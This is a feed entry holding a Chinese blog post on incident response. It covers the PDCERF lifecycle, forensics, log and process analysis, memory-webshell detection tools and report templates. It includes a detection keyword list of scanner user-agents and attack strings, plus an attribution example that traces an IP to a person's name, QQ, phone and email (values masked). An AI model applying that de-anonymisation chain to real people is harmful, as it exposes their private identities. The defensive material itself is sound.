  
  <entry>
    <title>应急响应-从攻击谈防守</title>
    <link href="https://jiangjiyue.github.io/2024/07/03/ac635236/"/>
    <id>https://jiangjiyue.github.io/2024/07/03/ac635236/</id>
    <published>2024-07-03T10:34:49.000Z</published>
    <updated>2024-11-05T06:14:06.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 27.68K</p>    </div>    <div class="cell" style="">    <p>代码: 9.10K, 文本: 7.71K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 1.22 小时</p>    </div>    </div>    <div class="tag-plugin video" style="aspect-ratio:1.7777777777777777;max-width:100%;">    <iframe src="https://player.bilibili.com/player.html?bvid=BV1j6421f7DK&autoplay=false" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true">    </iframe>    </div>    <h2 id="什么是应急响应"><a href="#什么是应急响应" class="headerlink" title="什么是应急响应"></a>什么是应急响应</h2><h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><blockquote><p>应急响应(Incident Response&#x2F;Emergency Response):</p><p>通常是指一个组织为了应对<mark class="tag-plugin colorful mark" color="red">各种意外事件</mark>的发生所做的准备工作以及在突发事件发生时或者发生后所采取的措施</p><p>计算机网络应急响应的<mark class="tag-plugin colorful mark" color="red">对象是指计算机或网络所存储、传输、处理的信息的安全事件</mark>,事件的主体可能来自自然界、系统自身故障(这里的系统包括主机范畴内的问题,也包括网络范畴内的问题)、组织内部或外部的人、计算机病毒或蠕虫等</p></blockquote><h3 id="应急处置"><a href="#应急处置" class="headerlink" title="应急处置"></a>应急处置</h3><blockquote><p>启动应急响应计划后,应立即采取相关措施抑制信息安全事件影响,避免造成更大损失.<br>在确定有效控制了信息安全事件影响后,开始实施恢复操作.<br>恢复阶段的行动集中于建立临时业务处理能力、修复原系统的损害、在原系统或新设施中<strong>恢复运行业务能力</strong>等应急措施.</p><p>信息安全应急响应计划规范GB&#x2F;T 24363-2009</p></blockquote><h2 id="应急响应生命周期-PDCERF"><a href="#应急响应生命周期-PDCERF" class="headerlink" title="应急响应生命周期(PDCERF)"></a>应急响应生命周期(PDCERF)</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211021921420.png" data-fancybox="true"/></div></div><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p><strong>预防为主</strong></p><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>微观</span></summary><div class="body"><ul><li>帮助服务对象建立安全政策</li><li>帮助服务对象按照安全政策配置安全设备和软件 扫描,风险分析,打补丁 如有条件且得到许可,建立监控设施</li></ul></div></details><details class="folder" index="1"><summary><span>宏观</span></summary><div class="body"><ul><li>建立协作体系和应急制度</li><li>建立信息沟通渠道和通报机制<ul><li>电话、即时通讯、email</li></ul></li><li>如有条件,建立数据汇总分析的体系和能力 有关法律法规的制定</li></ul></div></details><details class="folder" index="2"><summary><span>制定应急响应计划</span></summary><div class="body"><ul><li>应急经费筹集</li><li>人力资源<ul><li>指挥调度人员、协作人员</li><li>技术人员、专家</li><li>设备、系统和服务提供商</li></ul></li><li>硬件设备准备<ul><li>数据保护设备(磁盘、SAN)、冗余设备 (网络链路、网络设备、关键计算机设备</li></ul></li><li>软件工具准备<ul><li>备份软件、日志处理软件</li><li>系统软件、应急启动盘</li><li>病毒、恶意软件查杀软件</li></ul></li><li>现场备份</li><li>业务连续性保障<ul><li>系统容灾、搭建临时业务系统</li></ul></li></ul></div></details></div><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>微观(负责具体网络的CERT)-确定事件性质和处理人</span></summary><div class="body"><ul><li>确定事件的责任人：指定一个责任人全权处理,事件,给予必要的资源</li><li>确定事件的性质： 误会？玩笑？还是恶意的攻击&#x2F;入侵？ 影响的严重程度, 预计采用什么样的专用资源来修复？</li></ul></div></details><details class="folder" index="1"><summary><span>宏观(负责总体网络的CERT)</span></summary><div class="body"><ul><li>通过汇总,确定是否发生了全网的大规模事件</li><li>确定应急等级,以决定启动哪一级应急方案</li></ul></div></details><details class="folder" index="2"><summary><span>事故的标志(征兆和预兆)</span></summary><div class="body"><ul><li>Web服务器崩溃</li><li>用户抱怨主机连接网络速度过慢</li><li>子邮件管理员可以看到大批的反弹电子邮件与可疑内容</li><li>网络管理员通告了一个不寻常的偏离典型的网络流量流向</li></ul></div></details><details class="folder" index="3"><summary><span>来源</span></summary><div class="body"><ul><li>网络和主机IDS 、防病毒软件、文件完整性检查软件、系统、网络、蜜罐日志</li><li>公开可利用的信息、第三方监视服务</li></ul></div></details><details class="folder" index="4"><summary><span>确认事故</span></summary><div class="body"><ul><li>确认网络和系统轮廓： 分析事故的最好技术方法之一</li><li>理解正常的行为： 基于处理事故的良好准备</li><li>使用集中的日志管理并创建日志保留策略</li><li>执行事件关联</li><li>保持所有主机时钟同步</li><li>维护和使用信息知识库： 分析事故时的快速参考</li><li>使用互联网搜索引擎进行研究</li><li>运行包嗅探器以搜集更多的数据</li><li>过滤数据</li><li>经验是不可替代的</li><li>建立诊断矩阵</li><li>寻求帮助</li></ul></div></details><details class="folder" index="5"><summary><span>诊断矩阵实例</span></summary><div class="body"><table><thead><tr><th>征兆</th><th>拒绝服务</th><th>恶意代码</th><th>非授权访问</th><th>不正确使用</th></tr></thead><tbody><tr><td>文件,关键,访问尝试</td><td>低</td><td>中</td><td>高</td><td>低</td></tr><tr><td>文件,不适当的内容</td><td>低</td><td>中</td><td>低</td><td>高</td></tr><tr><td>主机崩溃</td><td>中</td><td>中</td><td>中</td><td>低</td></tr><tr><td>端口扫码,输入的, 不正常的</td><td>高</td><td>低</td><td>中</td><td>低</td></tr><tr><td>端口扫码,输出的, 不正常的</td><td>低</td><td>高</td><td>中</td><td>低</td></tr><tr><td>利用带宽高</td><td>高</td><td>中</td><td>低</td><td>中</td></tr><tr><td>利用电子邮件</td><td>中</td><td>高</td><td>中</td><td>中</td></tr></tbody></table></div></details></div><h3 id="遏制"><a href="#遏制" class="headerlink" title="遏制"></a>遏制</h3><p><strong>即时采取的行动</strong></p><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>微观</span></summary><div class="body"><ul><li>防止进一步的损失,确定后果</li><li>初步分析,重点是确定适当的封锁方法</li><li>咨询安全政策</li><li>确定进一步操作的风险</li><li>损失最小化(最快最简单的方式恢复系统的基本功能,例如备机启动)</li><li>可列出若干选项,讲明各自的风险,由服务对象选择</li></ul></div></details><details class="folder" index="1"><summary><span>宏观</span></summary><div class="body"><ul><li>确保封锁方法对各网业务影响最小</li><li>通过协调争取各网一致行动,实施隔离</li><li>汇总数据,估算损失和隔离效果</li></ul></div></details><details class="folder" index="2"><summary><span>建议组织机构为几类主要的事故建立单独的遏制策略</span></summary><div class="body"><p><strong>其标准包括：</strong></p><ul><li>潜在的破坏和资源的窃取</li><li><strong>证据保留的需要</strong></li><li>服务可用性(例如：网络连接,提供给外部当事方的服务)</li><li>实施战略需要的时间和资源</li><li>战略的有效性(例如：部分遏制事故,完全遏制事故)</li><li><strong>解决方案的期限</strong>(例如：紧急事故工作区需在4 小时内清除,临时工作区需在两周内清除,永久的解决方案)。</li></ul></div></details></div><h3 id="根除"><a href="#根除" class="headerlink" title="根除"></a>根除</h3><p><strong>长期的补救措施</strong></p><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>微观</span></summary><div class="body"><ul><li>详细分析,确定原因,定义征兆</li><li>分析漏洞</li><li>加强防范</li><li>消除原因</li><li>修改安全政策</li></ul></div></details><details class="folder" index="1"><summary><span>宏观</span></summary><div class="body"><ul><li>加强宣传,公布危害性和解决办法,呼吁用户解决终端的问题；</li><li>加强检测工作,发现和清理行业与重点部门的问题</li></ul></div></details></div><h3 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h3><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>微观</span></summary><div class="body"><ul><li>被攻击的系统恢复正常的工作状态</li><li>作一个新的备份</li><li>把所有安全上的变更作备份</li><li>服务重新上线</li><li>持续监控</li></ul></div></details><details class="folder" index="1"><summary><span>宏观</span></summary><div class="body"><ul><li>持续汇总分析,了解各网的运行情况</li><li>根据各网的运行情况判断隔离措施的有效性</li><li>通过汇总分析的结果判断仍然受影响的终端的规模</li><li>发现重要用户及时通报解决</li><li>适当的时候解除封锁措施</li></ul></div></details></div><h3 id="跟踪"><a href="#跟踪" class="headerlink" title="跟踪"></a>跟踪</h3><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>跟踪</span></summary><div class="body"><ul><li>关注系统恢复以后的安全状况,特别是曾经出问题的地方</li><li>建立跟踪文档,规范记录跟踪结果</li><li>对响应效果给出评估</li><li>对进入司法程序的事件,进行进一步的调查,打击违法犯罪活动</li><li>事件的归档与统计<ul><li>处理人、时间和时段、地点</li><li>工作量、事件的类型、对事件的处置情况</li><li>代价、细节</li></ul></li></ul></div></details></div><h2 id="应急响应思路流程"><a href="#应急响应思路流程" class="headerlink" title="应急响应思路流程"></a>应急响应思路流程</h2><h3 id="1、收集信息"><a href="#1、收集信息" class="headerlink" title="1、收集信息"></a>1、收集信息</h3><p>在赶往出事地点的路上以及还没有接触到具体业务时,要提前向客户询问清楚事件情况,如发现时间以及大致发生时间、事件造成的破坏、受害主机情况(如系统、版本、内外网)、客户的具体处置要求</p><h4 id="应急响应信息收集表"><a href="#应急响应信息收集表" class="headerlink" title="应急响应信息收集表"></a>应急响应信息收集表</h4><table><thead><tr><th>项目</th><th>描述</th></tr></thead><tbody><tr><td>发生时间</td><td>大致发生的时间段</td></tr><tr><td>感染主机数</td><td>感染了多数台主机</td></tr><tr><td>受害主机情况</td><td>什么系统、版本、小程序、Web还是OA、内网还是外网</td></tr><tr><td>补丁情况</td><td>打了哪些补丁,是否存在补丁漏打</td></tr><tr><td>中毒现象</td><td>勒索&#x2F;挖矿&#x2F;DoS&#x2F;僵尸网络&#x2F;后门&#x2F;木马</td></tr><tr><td>客户名称</td><td>什么区域的什么客户</td></tr><tr><td>帐号密码</td><td>确认是否有弱密码</td></tr><tr><td>对外开发端口</td><td>对外开发了哪些端口</td></tr><tr><td>开启的服务</td><td>开启了哪些服务</td></tr><tr><td>操作系统版本</td><td>操作系统版本信息</td></tr><tr><td>客户需求</td><td>确认客户具体需求</td></tr></tbody></table><h3 id="2、事件预定性"><a href="#2、事件预定性" class="headerlink" title="2、事件预定性"></a>2、事件预定性</h3><p>在初步了解情况后先做一个<strong>事件性质预判</strong>,判断下这个事件是个什么事件,是勒索还是挖矿还是其他事件。然后根据事件发生时间划定一个<strong>时间范围</strong>,重点排查这个时间段内的情况,从影响范围中确认一个<strong>排查范围</strong>。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150353.png" data-fancybox="true"/></div></div><h3 id="3、取证分析"><a href="#3、取证分析" class="headerlink" title="3、取证分析"></a>3、取证分析</h3><p>取证并非毫无头绪的,病毒本身必然有网络行为,内存必然有其二进制代码,它要么是单独的进程模块,要么是进程的dll&#x2F;so模块,通常,为了保活,它极可能还有自己的启动项、网络心跳包。</p><p>可以归结为如下4点要素：<strong>流量、内存、模块、启动项。</strong></p><p>流量分析可以使用<code>Wireshark</code>,主要分析下当前主机访问了哪些域名、URL、服务,或者有哪些外网IP在访问本地主机的哪些端口、服务和目录,又使用了何种协议等等。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150189.png" data-fancybox="true"/></div></div><h4 id="取证注意事项"><a href="#取证注意事项" class="headerlink" title="取证注意事项"></a>取证注意事项</h4><p><strong>保护</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">保证数据的安全性：制作磁盘映像——不在原始磁盘上操作</span><br><span class="line"></span><br><span class="line">保证数据完整性：取证中不使用可能破坏完整性的操作</span><br><span class="line"></span><br><span class="line">第三方监督：所有操作都有第三方在场监督</span><br></pre></td></tr></table></figure><p><strong>提取</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">优先提取易消失的证据：内存信息、系统进程、网络连接信息、路由信息、临时文件、缓存等</span><br><span class="line"></span><br><span class="line">文件系统：数据恢复、隐藏文件、加密文件、回收站、注册表、系统日志等</span><br><span class="line"></span><br><span class="line">应用系统：系统日志、中间件日志</span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">证据在什么地方：日志、删除的文件、临时文件、缓存</span><br><span class="line"></span><br><span class="line">从证据中能发现什么？如何关联证据？</span><br></pre></td></tr></table></figure><h3 id="4、定向分析"><a href="#4、定向分析" class="headerlink" title="4、定向分析"></a>4、定向分析</h3><p>二次定性后,我们基本已经真正掌握了事件情况,这时就可以进行各种分析,对各种情况利用各种工具快速分析</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150240.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150398.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150209.png" data-fancybox="true"/></div></div><h2 id="响应流程"><a href="#响应流程" class="headerlink" title="响应流程"></a>响应流程</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211021921528.png" data-fancybox="true"/></div></div><h3 id="事件发生"><a href="#事件发生" class="headerlink" title="事件发生"></a>事件发生</h3><p>运维监控人员、客服审核人员等发现问题,向上通报。</p><h3 id="事件确认"><a href="#事件确认" class="headerlink" title="事件确认"></a>事件确认</h3><p>收集事件信息、分析网络活动相关程序,日志和数据,判断事件的严重性,评估出问题的严重等级,是否向上进行汇报等。</p><h3 id="事件响应"><a href="#事件响应" class="headerlink" title="事件响应"></a>事件响应</h3><p>各部门通力合作,处理安全问题,具体解决问题,避免存在漏洞未修补、后门未清除等残留问题。</p><h3 id="事件关闭"><a href="#事件关闭" class="headerlink" title="事件关闭"></a>事件关闭</h3><p>处理完事件之后,需要关闭事件,并写出安全应急处理分析报告,完成整个应急过程。</p><h2 id="分析方向"><a href="#分析方向" class="headerlink" title="分析方向"></a>分析方向</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271923231.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271933249.png" data-fancybox="true"/></div></div><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><ul><li><p>基于变化的分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">日期</span><br><span class="line">文件增改</span><br><span class="line">最近使用文件</span><br></pre></td></tr></table></figure></li><li><p>源码分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检查源码改动</span><br><span class="line">查杀WebShell等后门</span><br></pre></td></tr></table></figure></li><li><p>系统日志分析</p></li><li><p>应用日志分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">分析User-Agent,e.g. awvs / burpsuite / w3af / nessus / openvas</span><br><span class="line">对每种攻击进行关键字匹配, e.g. select/alert/eval</span><br><span class="line">异常请求,连续的404-目录扫描、302-暴力破解、500等</span><br></pre></td></tr></table></figure></li><li><p><code>md5sum</code> 检查常用命令二进制文件的哈希,检查是否被植入<code>rootkit</code></p></li></ul><h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><ul><li><p>符合以下特征的进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CPU或内存资源占用长时间过高</span><br><span class="line">没有签名验证信息</span><br><span class="line">没有描述信息的进程</span><br><span class="line">进程的路径不合法</span><br></pre></td></tr></table></figure></li><li><p><code>dump</code>系统内存进行分析</p></li><li><p>正在运行的进程</p></li><li><p>正在运行的服务</p></li><li><p>父进程和子进程</p></li><li><p>后台可执行文件的完整哈希</p></li><li><p>已安装的应用程序</p></li><li><p>运行着密钥或其他正在自动运行的持久化程序</p></li><li><p>计划任务</p></li></ul><h3 id="身份信息分析"><a href="#身份信息分析" class="headerlink" title="身份信息分析"></a>身份信息分析</h3><ul><li>本地以及域账号用户</li><li>异常的身份验证</li><li>非标准格式的用户名</li></ul><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><ul><li>杀软检测记录</li><li>系统日志</li><li>中间件日志</li></ul><h3 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h3><ul><li>监听端口和相关服务</li><li>最近建立的网络连接</li><li>RDP &#x2F; VPN &#x2F; SSH 等会话</li><li>防火墙配置</li><li>DNS配置</li><li>路由配置</li></ul><h3 id="配置分析"><a href="#配置分析" class="headerlink" title="配置分析"></a>配置分析</h3><ul><li>查看配套的注册表信息检索,SAM文件</li><li>查看环境变量</li><li>查看Linux SE等配置</li><li>内核模块</li></ul><h2 id="木马排查实战流程"><a href="#木马排查实战流程" class="headerlink" title="木马排查实战流程"></a>木马排查实战流程</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407092034988.jpeg" data-fancybox="true"/></div></div><h2 id="内存马查杀"><a href="#内存马查杀" class="headerlink" title="内存马查杀"></a>内存马查杀</h2><ol><li><code>visualvm</code> 适用于servlet或filter框架组件内存马(JDK1.8以上,bin文件下)自带<div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/oracle/visualvm"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=oracle&repo=visualvm&theme=dark&show_owner=true"/></a></div></li><li>arthas 适用于servlet或filter框架组件内存马是阿里巴巴开源的Java诊断工具<div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/alibaba/arthas"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=alibaba&repo=arthas&theme=dark&show_owner=true"/></a></div></li><li>copagent 适用于servlet,filter,listenter框架组件内存马<div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/LandGrey/copagent"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=LandGrey&repo=copagent&theme=dark&show_owner=true"/></a></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261209270.png" data-fancybox="true"/></div></div></li></ol><h2 id="研判与溯源"><a href="#研判与溯源" class="headerlink" title="研判与溯源"></a>研判与溯源</h2><h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407092036587.jpeg" data-fancybox="true"/></div></div><ol><li>定位事件<ol><li>设备告警</li><li>辅助设备</li><li>告警事件</li><li>应急响应</li></ol></li><li>分析服务器以及相应服务开放的端口<ol><li>21 3389 445 443 80 3306 8080</li></ol></li><li>分析服务被攻击的方法<ol><li>OWASP TOP 10</li><li>爆破</li><li>欺骗</li><li>钓鱼</li><li>漏洞利用</li></ol></li><li>分析日志</li><li>查找Webshell</li><li>分析网站数据库连接账号权限</li><li>分析网站容器权限</li><li>被提权了 <ol><li>查看补丁</li><li>查看账号连接情况(分析注册表如是否被克隆账号)</li><li>查看网络连接</li><li>分析进程</li><li>分析注册表启动程序</li><li>分析日志</li><li>分析一些提权工具 <ol><li>漏洞利用程序</li><li>执行对比命令</li><li>mimakatz</li></ol></li></ol></li><li>报告整理</li></ol><h3 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306262012302.png" data-fancybox="true"/></div></div><h3 id="用户画像绘制流程"><a href="#用户画像绘制流程" class="headerlink" title="用户画像绘制流程"></a>用户画像绘制流程</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306262012028.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407131935457.png" data-fancybox="true"/></div></div><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>案例</span></summary><div class="body"><p>IP 反查域名</p><ol><li>对 IP 进行威胁情报中心查询，IP 反查到域名<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407131937547.png" data-fancybox="true"/></div></div></li><li>多个域名实时解析均为 129.226.xxx.xxx。发现该 ip 关联域名，访问获取到该人姓<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407131945357.png" data-fancybox="true"/></div></div></li><li>访问域名<br>通过访问域名的<a href="https://web.archive.org/">历史快照</a>获取关键信息<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407131939546.png" data-fancybox="true"/></div></div></li><li>进一步搜索人名相关信息<br>获取 QQ 信息为 8888888，电话为 188888888，邮箱为 <a href="mailto:&#x38;&#56;&#56;&#x38;&#x38;&#x38;&#x38;&#64;&#x67;&#x6d;&#x61;&#105;&#108;&#46;&#x63;&#111;&#x6d;">&#x38;&#56;&#56;&#x38;&#x38;&#x38;&#x38;&#64;&#x67;&#x6d;&#x61;&#105;&#108;&#46;&#x63;&#111;&#x6d;</a>。 通过手机号搜索微信，在视频号叫***，并与Github ID一致。<br>个人简介中热爱编程，QQ 为 8888888，QQ 为同一个，信息准确。 通过常用 id 为 88888888 搜索 github</li></ol></div></details></div><h2 id="重大信息安全事件报告表"><a href="#重大信息安全事件报告表" class="headerlink" title="重大信息安全事件报告表"></a>重大信息安全事件报告表</h2><table><thead><tr><th>重大信息安全事件报告表</th><th></th></tr></thead><tbody><tr><td>报告时间： x 年x 月x 日x 时x 分</td><td></td></tr><tr><td>单位名称：</td><td>报告人：</td></tr><tr><td>联系电话：</td><td>通讯地址：</td></tr><tr><td>传真：</td><td>电子邮件：</td></tr><tr><td>发生重大信息安全事件的信息系统名称及用途：</td><td></td></tr><tr><td>负责部门：</td><td>负责人：</td></tr><tr><td>重大信息安全事件的简要描述(如以前出现过类似情况也应加以说明)：</td><td></td></tr><tr><td>初步判定的事故原因：</td><td></td></tr><tr><td>当前采取的措施：</td><td></td></tr><tr><td>本次重大信息安全事件的初步影响状况：</td><td></td></tr><tr><td>影响范围：</td><td>严重程度：</td></tr><tr><td>值班电话：</td><td>传真：</td></tr></tbody></table><h2 id="应急响应总结模板"><a href="#应急响应总结模板" class="headerlink" title="应急响应总结模板"></a>应急响应总结模板</h2><table><thead><tr><th>信息安全事件应急响应结果报告表</th><th></th></tr></thead><tbody><tr><td>原事件报告时间： x 年x 月x 日x 时x 分</td><td></td></tr><tr><td>备案编号： x 年x 月x 日x 第 x 号</td><td></td></tr><tr><td>单位名称：</td><td>报告人：</td></tr><tr><td>联系电话：</td><td>通讯地址：</td></tr><tr><td>信息系统名称及用途：</td><td></td></tr><tr><td>已采用的安全措施：</td><td></td></tr><tr><td>信息安全事件的补充描述及最后判定的事故原因：</td><td></td></tr><tr><td>本次信息安全事件的初步影响状况：</td><td></td></tr><tr><td>事后结果：</td><td>影响范围：</td></tr><tr><td>严重程度：</td><td></td></tr><tr><td>本次信息安全事件的主要处理过程及结果：</td><td></td></tr><tr><td>针对此类信息安全事件应采取的保障信息系统安全的措施和建议：</td><td></td></tr><tr><td>报告人签名：</td><td></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Windows" scheme="https://jiangjiyue.github.io/tags/Windows/"/>
    
  </entry>
  
</feed>
